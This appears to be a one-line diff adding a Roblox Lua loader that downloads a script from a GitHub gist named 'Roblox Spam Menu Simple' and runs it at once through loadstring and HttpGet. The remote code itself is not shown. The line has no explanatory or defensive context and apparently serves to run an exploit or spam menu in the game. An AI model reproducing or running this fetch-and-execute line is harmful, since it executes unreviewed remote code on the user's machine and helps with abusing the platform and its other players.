@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/leopoldhahn1212/302aea0d75e473033711bf8c118eb2d0/raw/9033cdac194cb09c0b2ff6ef2ef983d40b567882/Roblox%2520Spam%2520Menu%2520Simple"))();
